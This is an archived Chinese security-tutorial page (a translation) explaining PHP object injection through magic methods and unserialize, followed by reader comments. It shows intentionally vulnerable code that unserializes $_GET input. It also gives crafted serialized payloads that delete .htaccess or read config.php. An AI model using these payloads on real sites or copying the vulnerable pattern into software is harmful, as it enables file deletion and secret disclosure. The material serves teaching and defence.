@@ -1,0 +1,987 @@
+
+
+  
+
+  
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">理解php对象注入</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" class="author name ng-binding">
+          路人甲</a>
+        <span class="bull">·</span>
+        <time title="2015/02/03 12:23" ui-time="" datetime="2015/02/03 12:23" class="published ng-binding ng-isolate-scope">2015/02/03 12:23</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        </p><h1>0x00 背景</h1>
+
+<hr>
+
+<p>原文:http://securitycafe.ro/2015/01/05/understanding-php-object-injection/</p>
+
+<p>php对象注入是一个非常常见的漏洞，这个类型的漏洞虽然有些难以利用，但仍旧非常危险，为了理解这个漏洞，请读者具备基础的php知识。</p>
+
+<h1>0x01 漏洞案例</h1>
+
+<hr>
+
+<p>如果你觉得这是个渣渣洞，那么请看一眼这个列表，一些被审计狗挖到过该漏洞的系统，你可以发现都是一些耳熟能详的玩意（就国外来说）</p>
+
+<p><a href="https://vagosec.org/2013/09/wordpress-php-object-injection/">WordPress 3.6.1</a></p>
+
+<p><a href="https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/">Magento 1.9.0.1</a></p>
+
+<p><a href="http://www.exploit-db.com/exploits/25087/">Joomla 3.0.3</a></p>
+
+<p><a href="http://www.exploit-db.com/exploits/22398/">Ip board 3.3.5</a></p>
+
+<p>除此之外等等一堆系统，八成可能大概在这些还有其他的php程序中还有很多这种类型的漏洞，所以不妨考虑坐下喝杯咖啡并且试着去理解这篇文章。</p>
+
+<!--more-->
+
+<h1>0x01 PHP类和对象</h1>
+
+<hr>
+
+<p>类和变量是非常容易理解的php概念，打个比方，下面的代码在一个类中定义了一个变量和一个方法。</p>
+
+<pre><code>#!php
+&lt;?php
+
+class TestClass
+{
+    // 一个变量
+
+    public $variable = 'This is a string';
+
+    // 一个简单的方法
+
+    public function PrintVariable()
+    {
+        echo $this-&gt;variable;
+    }
+}
+
+// 创建一个对象
+
+$object = new TestClass();
+
+// 调用一个方法
+
+$object-&gt;PrintVariable();
+
+?&gt;
+</code></pre>
+
+<p>它创建了一个对象并且调用了 PrintVariable 函数，该函数会输出变量 variable。</p>
+
+<p>如果想了解更多关于php面向对象编程的知识 请点： http://php.net/manual/zh/language.oop5.php</p>
+
+<h1>0x02 php magic方法</h1>
+
+<hr>
+
+<p>php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号“&#95;&#95;”开头的，比如 &#95;&#95;construct, &#95;&#95;destruct, &#95;&#95;toString, &#95;&#95;sleep, &#95;&#95;wakeup 和其他的一些玩意。</p>
+
+<p>这些函数在某些情况下会自动调用，比如:</p>
+
+<p>&#95;&#95;construct 当一个对象创建时调用 (constructor) &#95;&#95;destruct 当一个对象被销毁时调用 (destructor) __ toString当一个对象被当作一个字符串使用</p>
+
+<p>为了更好的理解magic方法是如何工作的，让我们添加一个magic方法在我们的类中。</p>
+
+<pre><code>#!php
+&lt;?php
+
+class TestClass
+{
+    // 一个变量
+
+    public $variable = 'This is a string';
+
+    // 一个简单的方法
+
+    public function PrintVariable()
+    {
+        echo $this-&gt;variable . '&lt;br /&gt;';
+    }
+
+    // Constructor
+
+    public function __construct()
+    {
+        echo '__construct &lt;br /&gt;';
+    }
+
+    // Destructor
+
+    public function __destruct()
+    {
+        echo '__destruct &lt;br /&gt;';
+    }
+
+    // Call
+
+    public function __toString()
+    {
+        return '__toString&lt;br /&gt;';
+    }
+}
+
+// 创建一个对象
+//  __construct会被调用
+
+$object = new TestClass();
+
+// 创建一个方法
+//  'This is a string’ 这玩意会被输出
+
+$object-&gt;PrintVariable();
+
+// 对象被当作一个字符串
+//  __toString 会被调用
+
+echo $object;
+
+// End of PHP script
+// php脚本要结束了， __destruct会被调用
+
+?&gt;
+</code></pre>
+
+<p>我们往里头放了三个 magic方法，&#95;&#95;construct, &#95;&#95;destruct和 &#95;&#95;toString，你可以看出来，&#95;&#95;construct在对象创建时调用， &#95;&#95;destruct在php脚本结束时调用，&#95;&#95;toString在对象被当作一个字符串使用时调用。</p>
+
+<p>这个脚本会输出这狗样：</p>
+
+<pre><code>__construct 
+This is a string 
+__toString 
+__destruct
+</code></pre>
+
+<p>这只是一个简单的例子，如果你想了解更多有关magic函数的例子，请点击下面的链接：</p>
+
+<p>http://php.net/manual/zh/language.oop5.magic.php</p>
+
+<h1>0x03 php对象序列化</h1>
+
+<hr>
+
+<p>php允许保存一个对象方便以后重用，这个过程被称为序列化，打个比方，你可以保存一个包含着用户信息的对象方便等等重用。</p>
+
+<p>为了序列化一个对象，你需要调用 “serialize”函数，函数会返回一个字符串，当你需要用到这个对象的时候可以使用“unserialize”去重建对象。</p>
+
+<p>让我们在序列化丢进那个例子，看看序列化张什么样。</p>
+
+<pre><code>#!php
+&lt;?php
+
+// 某类
+
+class User
+{
+    // 类数据
+
+    public $age = 0;
+    public $name = '';
+
+    // 输出数据
+
+    public function PrintData()
+    {
+        echo 'User ' . $this-&gt;name . ' is ' . $this-&gt;age
+             . ' years old. &lt;br /&gt;';
+    }
+}
+
+// 创建一个对象
+
+$usr = new User();
+
+// 设置数据
+
+$usr-&gt;age = 20;
+$usr-&gt;name = 'John';
+
+// 输出数据
+
+$usr-&gt;PrintData();
+
+// 输出序列化之后的数据
+
+echo serialize($usr);
+
+?&gt;
+</code></pre>
+
+<p>它会输出</p>
+
+<pre><code>User John is 20 years old. 
+O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"John”;}
+</code></pre>
+
+<p>你可以看到序列化之后的数据中 有 20和John，其中没有任何跟类有关的东西，只有其中的数据被数据化。</p>
+
+<p>为了使用这个对象，我们用unserialize重建对象。</p>
+
+<pre><code>#!php
+&lt;?php
+
+// 某类
+
+class User
+{
+    // Class data
+
+    public $age = 0;
+    public $name = '';
+
+    // Print data
+
+    public function PrintData()
+    {
+        echo 'User ' . $this-&gt;name . ' is ' . $this-&gt;age . ' years old. &lt;br /&gt;';
+    }
+}
+
+// 重建对象
+
+$usr = unserialize('O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"John";}');
+
+// 调用PrintData 输出数据
+
+$usr-&gt;PrintData();
+
+?&gt;
+</code></pre>
+
+<p>着会输出</p>
+
+<pre><code>User John is 20 years old
+</code></pre>
+
+<h1>0x04 序列化magic函数</h1>
+
+<hr>
+
+<p>magic函数constructor (&#95;&#95;construct)和 destructor (&#95;&#95;destruct) 是会在对象创建或者销毁时自动调用，其他的一些magic函数会在serialize 或者 unserialize的时候被调用。</p>
+
+<p>&#95;&#95;sleep magic方法在一个对象被序列化的时候调用。 &#95;&#95;wakeup magic方法在一个对象被反序列化的时候调用。</p>
+
+<p>注意 __sleep 必须返回一个数组与序列化的变量名。</p>
+
+<pre><code>#!php
+&lt;?php
+
+class Test
+{
+    public $variable = 'BUZZ';
+    public $variable2 = 'OTHER';
+
+    public function PrintVariable()
+    {
+        echo $this-&gt;variable . '&lt;br /&gt;';
+    }
+
+    public function __construct()
+    {
+        echo '__construct&lt;br /&gt;';
+    }
+
+    public function __destruct()
+    {
+        echo '__destruct&lt;br /&gt;';
+    }
+
+    public function __wakeup()
+    {
+        echo '__wakeup&lt;br /&gt;';
+    }
+
+    public function __sleep()
+    {
+        echo '__sleep&lt;br /&gt;';
+
+        return array('variable', 'variable2');
+    }
+}
+
+// 创建一个对象，会调用 __construct
+
+$obj = new Test();
+
+// 序列化一个对象，会调用 __sleep
+
+$serialized = serialize($obj);
+
+//输出序列化后的字符串
+
+print 'Serialized: ' . $serialized . &lt;br /&gt;';
+
+// 重建对象，会调用 __wakeup
+
+$obj2 = unserialize($serialized);
+
+//调用 PintVariable, 会输出数据 (BUZZ)
+
+$obj2-&gt;PrintVariable();
+
+// php脚本结束，会调用 __destruct 
+
+?&gt;
+</code></pre>
+
+<p>这玩意会输出：</p>
+
+<pre><code>__construct 
+__sleep 
+Serialized: O:4:"Test":2:
+{s:8:"variable";s:4:"BUZZ";s:9:"variable2";s:5:"OTHER";} 
+__wakeup 
+BUZZ 
+__destruct 
+__destruct
+</code></pre>
+
+<p>你可以看到，我们创建了一个对象，序列化了它（然后&#95;&#95;sleep被调用），之后用序列化对象重建后的对象创建了另一个对象，接着php脚本结束的时候两个对象的&#95;&#95;destruct都会被调用。</p>
+
+<p>更多相关的内容</p>
+
+<p>http://php.net/manual/zh/language.oop5.serialization.php</p>
+
+<h1>0x05 php对象注入</h1>
+
+<hr>
+
+<p>现在我们理解了序列化是如何工作的，我们该如何利用它？事实上，利用这玩意的可能性有很多种，关键取决于应用程序的流程与，可用的类，与magic函数。</p>
+
+<p>记住序列化对象的值是可控的。</p>
+
+<p>你可能会找到一套web程序的源代码，其中某个类的&#95;&#95;wakeup 或者 &#95;&#95;destruct and其他乱七八糟的函数会影响到web程序。</p>
+
+<p>打个比方，我们可能会找到一个类用于临时将日志储存进某个文件，当__destruct被调用时，日志文件会被删除。然后代码张这狗样。</p>
+
+<pre><code>#!php
+&lt;?php 
+
+class LogFile
+{
+    // log文件名
+
+    public $filename = 'error.log';
+
+    // 某代码，储存日志进文件
+
+    public function LogData($text)
+    {
+        echo 'Log some data: ' . $text . '&lt;br /&gt;';
+        file_put_contents($this-&gt;filename, $text, FILE_APPEND);
+    }
+
+    // Destructor 删除日志文件
+
+    public function __destruct()
+    {
+        echo '__destruct deletes "' . $this-&gt;filename . '" file. &lt;br /&gt;';
+        unlink(dirname(__FILE__) . '/' . $this-&gt;filename);
+    }
+}
+
+?&gt;
+</code></pre>
+
+<p>某例子关于如何使用这个类</p>
+
+<pre><code>#!php
+&lt;?php
+
+include 'logfile.php';
+
+// 创建一个对象
+
+$obj = new LogFile();
+
+// 设置文件名和要储存的日志数据
+
+$obj-&gt;filename = 'somefile.log';
+$obj-&gt;LogData('Test');
+
+// php脚本结束啦，__destruct被调用，somefile.log文件被删除。
+
+?&gt;
+</code></pre>
+
+<p>在其他的脚本，我们可能又恰好找到一个调用“unserialize”函数的，并且恰好变量是用户可控的，又恰好是$_GET之类的什么玩意的。</p>
+
+<pre><code>#!php
+&lt;?php
+
+include 'logfile.php';
+
+// ... 一些狗日的代码和 LogFile 类 ...
+
+// 简单的类定义
+
+class User
+{
+    // 类数据
+
+    public $age = 0;
+    public $name = '';
+
+    // 输出数据
+
+    public function PrintData()
+    {
+        echo 'User ' . $this-&gt;name . ' is ' . $this-&gt;age . ' years old. &lt;br /&gt;';
+    }
+}
+
+// 重建 用户输入的 数据
+
+$usr = unserialize($_GET['usr_serialized']);
+
+?&gt;
+</code></pre>
+
+<p>你看，这个代码调用了 “LogClass” 类，并且有一个 “unserialize” 值是我们可以注入的。</p>
+
+<p>所以构造类似这样的东西：</p>
+
+<pre><code>script.php?usr_serialized=O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"John”;}
+</code></pre>
+
+<p>究竟发生了什么呢，因为输入是可控的，所以我们可以构造任意的序列化对象，比如：</p>
+
+<pre><code>#!php
+&lt;?php
+
+$obj = new LogFile();
+$obj-&gt;filename = '.htaccess';
+
+echo serialize($obj) . '&lt;br /&gt;';
+
+?&gt;
+</code></pre>
+
+<p>这个会输出</p>
+
+<pre><code>O:7:"LogFile":1:{s:8:"filename";s:9:".htaccess";} 
+__destruct deletes ".htaccess" file.
+</code></pre>
+
+<p>现在我们将构造过后的序列化对象发送给刚才的脚本：</p>
+
+<pre><code>script.php?usr_serialized=O:7:"LogFile":1:{s:8:"filename";s:9:".htaccess”;}
+</code></pre>
+
+<p>这会输出</p>
+
+<pre><code>__destruct deletes ".htaccess" file.
+</code></pre>
+
+<p>现在 .htaccess 已经被干掉了，因为脚本结束时 __destruct会被调用。不过我们已经可以控制“LogFile”类的变量啦。</p>
+
+<p>这就是漏洞名称的由来：变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行或者其他坑爹的行为。</p>
+
+<p>虽然这不是一个很好的例子，不过我相信你可以理解这个概念，unserialize自动调用 &#95;&#95;wakeup 和 &#95;&#95;destruct，接着攻击者可以控制类变量，并且攻击web程序。</p>
+
+<h1>0x06 常见的注入点</h1>
+
+<hr>
+
+<p>先不谈 &#95;&#95;wakeup 和 &#95;&#95;destruct，还有一些很常见的注入点允许你利用这个类型的漏洞，一切都是取决于程序逻辑。</p>
+
+<p>打个比方，某用户类定义了一个&#95;&#95;toString为了让应用程序能够将类作为一个字符串输出（echo $obj） ,而且其他类也可能定义了一个类允许&#95;&#95;toString读取某个文件。</p>
+
+<pre><code>#!php
+&lt;?php 
+
+// … 一些include ...
+
+class FileClass
+{
+    // 文件名
+
+    public $filename = 'error.log';
+
+    //当对象被作为一个字符串会读取这个文件
+
+    public function __toString()
+    {
+        return file_get_contents($this-&gt;filename);
+    }
+}
+
+// Main User class
+
+class User
+{
+    // Class data
+
+    public $age = 0;
+    public $name = '';
+
+    // 允许对象作为一个字符串输出上面的data
+
+    public function __toString()
+    {
+        return 'User ' . $this-&gt;name . ' is ' . $this-&gt;age . ' years old. &lt;br /&gt;';
+    }
+}
+
+// 用户可控
+
+$obj = unserialize($_GET['usr_serialized']);
+
+// 输出 __toString
+
+echo $obj;
+
+?&gt;
+</code></pre>
+
+<p>so,我们构造url</p>
+
+<pre><code>script.php?usr_serialized=O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"John”;}
+</code></pre>
+
+<p>再想想，如果我们用序列化调用 FileClass呢</p>
+
+<p>我们创建利用代码</p>
+
+<pre><code>#!php
+&lt;?php
+
+$fileobj = new FileClass();
+$fileobj-&gt;filename = 'config.php';
+
+echo serialize($fileobj);
+
+?&gt;
+</code></pre>
+
+<p>接着用生成的exp注入url</p>
+
+<pre><code>script.php?usr_serialized=O:9:"FileClass":1:{s:8:"filename";s:10:"config.php”;}
+</code></pre>
+
+<p>接着网页会输出 config.php的源代码</p>
+
+<pre><code>#!php
+&lt;?php
+
+$private_data = 'MAGIC';
+
+?&gt;
+</code></pre>
+
+<p>ps:我希望这让你能够理解。</p>
+
+<h1>0x07 其他的利用方法</h1>
+
+<hr>
+
+<p>可能其他的一些magic函数海存在利用点：比如&#95;&#95;call 会在对象调用不存在的函数时调用，&#95;&#95;get 和 __set会在对象尝试访问一些不存在的类，变量等等时调用。</p>
+
+<p>不过需要注意的是，利用场景不限于magic函数，也有一些方式可以在一半的函数中利用这个漏洞，打个比方，一个模块可能定义了一个叫get的函数进行一些敏感的操作，比如访问数据库，这就可能造成sql注入，取决于函数本身的操作。</p>
+
+<p>唯一的一个技术难点在于，注入的类必须在注入点所在的地方，不过一些模块或者脚本会使用“autoload”的功能，具体可以在这里了解</p>
+
+<p>http://php.net/manual/zh/language.oop5.autoload.php</p>
+
+<p>ps:去读那狗屎的代码</p>
+
+<h1>0x08 如何利用或者避免这个漏洞</h1>
+
+<hr>
+
+<p>别在任何用户可控的地方使用“unserialize”，可以考虑“json_decode“</p>
+
+<h1>0x09 结论</h1>
+
+<hr>
+
+<p>虽然很难找到而且很难利用，但是这真的真的很严重，可以导致各种各样的漏洞。</p>      <p></p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+		<div style="float:left;color:#9d9e9f;font-size:15px">
+			<span>
+				&copy;乌云知识库版权所有 未经许可 禁止转载
+			</span>
+		</div>
+        
+
+      </div>
+
+          
+  <!-- collect end -->
+  <!-- recommend -->
+  <div class="yarpp-related">
+<h3>为您推荐了适合您的技术文章:</h3>
+<ol id="recommandsystem">
+		<li><a href="http://drops.wooyun.org/papers/660" rel="bookmark" id="re1">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
+			<li><a href="http://drops.wooyun.org/papers/596" rel="bookmark" id="re2">WordPress < 3.6.1 PHP 对象注入漏洞</a></li>
+			<li><a href="http://drops.wooyun.org/papers/785" rel="bookmark" id="re3">WordPress 3.5.1远程代码执行EXP</a></li>
+			<li><a href="http://drops.wooyun.org/tips/3911" rel="bookmark" id="re4">PHP WDDX Serializier Data Injection Vulnerability</a></li>
+	 
+</ol>
+</div>
+  <!-- recommend end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            
+          <div id="comment-list">
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">BeenQuiver</span>
+                 <span class="reply-time">2016-03-13 15:10:57</span>
+        </div>
+        <p></p><p>又看了一遍</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">juju</span>
+                 <span class="reply-time">2016-01-15 14:38:27</span>
+        </div>
+        <p></p><p>@agnes0621 这是一个比较坑的点，求大神指导</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">BeenQuiver</span>
+                 <span class="reply-time">2015-11-05 19:10:36</span>
+        </div>
+        <p></p><p>6666</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">agnes0621</span>
+                 <span class="reply-time">2015-04-14 16:36:07</span>
+        </div>
+        <p></p><p>又遇到了一个限制条件，php执行时遇到严重错误而终止脚本后好像不会销毁对象。<br>
+也就是说$obj = unserialize($_GET[&#039;usr_serialized&#039;]);反序列化后，如果拿$obj去做了一些别的事，比如$a=$obj[&#039;a&#039;],这样就会报错，于是$obj的析构函数就不会被调用。。。。。。。。。。坑啊</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">HackBraid</span>
+                 <span class="reply-time">2015-02-21 07:47:12</span>
+        </div>
+        <p></p><p>先赞一个吧</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">从容</span>
+                 <span class="reply-time">2015-02-19 14:27:25</span>
+        </div>
+        <p></p><p>print &#039;Serialized: &#039; . $serialized . &lt;br /&gt;&#039;;这段后面缺个单引号</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">从容</span>
+                 <span class="reply-time">2015-02-16 21:11:30</span>
+        </div>
+        <p></p><p>哦对了，应该把PHP Object Injection is not a very common vulnerability这句的not去掉</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">从容</span>
+                 <span class="reply-time">2015-02-16 21:10:29</span>
+        </div>
+        <p></p><p>为什么这文章能让我边看边笑？笑得肚子疼......不说了，医生说该到我做胃CT了</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">黑吃黑</span>
+                 <span class="reply-time">2015-02-10 14:39:08</span>
+        </div>
+        <p></p><p>翻译的好辛苦</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">隐形人真忙</span>
+                 <span class="reply-time">2015-02-07 00:35:37</span>
+        </div>
+        <p></p><p>这漏洞也太猥琐了。。。。。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">刘海哥</span>
+                 <span class="reply-time">2015-02-06 13:02:12</span>
+        </div>
+        <p></p><p>看得晕晕的！</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">cf_hb</span>
+                 <span class="reply-time">2015-02-05 13:27:26</span>
+        </div>
+        <p></p><p>http://coffee.ostrich.cc/?p=10 翻译的好辛苦</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">懒懒滴1994</span>
+                 <span class="reply-time">2015-02-04 23:39:58</span>
+        </div>
+        <p></p><p>0x06的文件内容读取貌似是不行的？不知道作者实践过没有？还有就是双引号，，，，</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">DBA</span>
+                 <span class="reply-time">2015-02-04 23:16:24</span>
+        </div>
+        <p></p><p>简单说就是code injection</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Me_Fortune</span>
+                 <span class="reply-time">2015-02-04 16:13:32</span>
+        </div>
+        <p></p><p>哈哈哈哈哈。。。。。我以我三级的英语水平告诉你，有道是对的。。。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">cf_hb</span>
+                 <span class="reply-time">2015-02-04 15:49:48</span>
+        </div>
+        <p></p><p>PHP Object Injection is not a very common vulnerability<br>
+PHP对象注入并不是一个很常见的漏洞-----by 有道词典</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">封停</span>
+                 <span class="reply-time">2015-02-04 13:16:10</span>
+        </div>
+        <p></p><p>楼主的注释很精彩~</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Th1nk</span>
+                 <span class="reply-time">2015-02-04 12:41:02</span>
+        </div>
+        <p></p><p>获取po主的翻译力求风趣，但是我的翻译洁癖让我无法忍受。。。错别字跟坑爹解说</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">reatang</span>
+                 <span class="reply-time">2015-02-04 10:42:19</span>
+        </div>
+        <p></p><p>这是问题么？</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">sphenginx</span>
+                 <span class="reply-time">2015-02-04 10:09:14</span>
+        </div>
+        <p></p><p>现在很少有框架对输入没有做 XSS 和 CRLF的过滤的吧？</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">齐迹</span>
+                 <span class="reply-time">2015-02-04 09:28:05</span>
+        </div>
+        <p></p><p>一般情况下都不会在构造和析构函数中干非常敏感的事情。所以利用还是满苛刻的。不过思路非常赞！</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">0x_Jin</span>
+                 <span class="reply-time">2015-02-03 17:07:12</span>
+        </div>
+        <p></p><p>至于利用看环境来 一般情况下确实难利用。<br>
+之前一个例子 没有判断穿过去的参数 然后传过去了一个对象 操作了对方的mongodb数据库 感觉也是大同小异 都是在传参的时候穿过去了一个object</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">0x_Jin</span>
+                 <span class="reply-time">2015-02-03 17:02:56</span>
+        </div>
+        <p></p><p>不只是php 是所有没有对querystring做过滤的语言都可以<br>
+node.js ruby等也同样存在此类问题</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">retanoj</span>
+                 <span class="reply-time">2015-02-03 13:43:08</span>
+        </div>
+        <p></p><p>// 创建一个方法<br>
+//  &#039;This is a string’ 这玩意会被输出</p>
+<p>$object-&gt;PrintVariable();</p>
+<p>建议修改成 </p>
+<p>// 调用一个方法<br>
+//  &#039;This is a string’ 这玩意会被输出</p>
+<p>$object-&gt;PrintVariable();</p>
+<p>楼主翻译比较搞笑。。一些狗日的代码。。。。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Ano_Tom</span>
+                 <span class="reply-time">2015-02-03 12:53:38</span>
+        </div>
+        <p></p><p>magic函数可翻译为魔术函数</p>
+<p></p>
+        
+      </div>
+    </div>
+      </div>
+  </div>
+  <!-- comment end -->
+  
+</div>
+</main>
